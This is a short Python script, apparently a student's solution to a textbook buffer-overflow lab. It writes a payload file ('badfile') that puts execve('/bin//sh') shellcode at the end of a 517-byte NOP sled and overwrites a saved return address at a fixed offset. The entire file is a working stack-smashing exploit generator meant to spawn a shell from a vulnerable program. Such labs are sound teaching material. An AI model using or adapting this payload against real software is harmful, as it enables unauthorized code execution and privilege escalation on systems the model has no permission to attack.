#!/usr/bin/python3
import sys

# Replaced with shellcode from textbook
shellcode= (
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode at the end of the payload
start = 517 - len(shellcode)

#content[start:start + len(shellcode)] = shellcode
content[start:] = shellcode

ret = 0xffffcb48 + 200
# ebp + 200 bc of gbd debugging method potentially running other methods & bc ret cannot have 0s in any bytes (this would make badfile have a 0 in the middle)

#offset = (0xffffcb48 - ) + 4 # ebp + 4 (0xffffcb48 + 4)
offset = 0x171 + 4
L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
#content[112:116] = (ret).to_bytes(4,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
